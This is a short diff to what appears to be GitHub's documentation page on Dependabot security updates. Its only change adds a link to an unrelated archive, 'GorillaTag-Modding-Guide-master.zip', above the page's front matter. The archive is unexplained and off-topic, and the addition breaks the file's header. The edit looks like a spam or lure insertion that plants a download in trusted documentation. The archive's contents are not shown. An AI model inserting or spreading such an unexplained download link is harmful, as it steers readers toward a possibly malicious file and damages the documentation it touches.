@@ -1,3 +1,4 @@
+[GorillaTag-Modding-Guide-master.zip](https://github.com/github/docs/files/6682820/GorillaTag-Modding-Guide-master.zip)
 ---
 title: About Dependabot security updates
 intro: '{% data variables.product.prodname_dependabot %} can fix vulnerable dependencies for you by raising pull requests with security updates.'
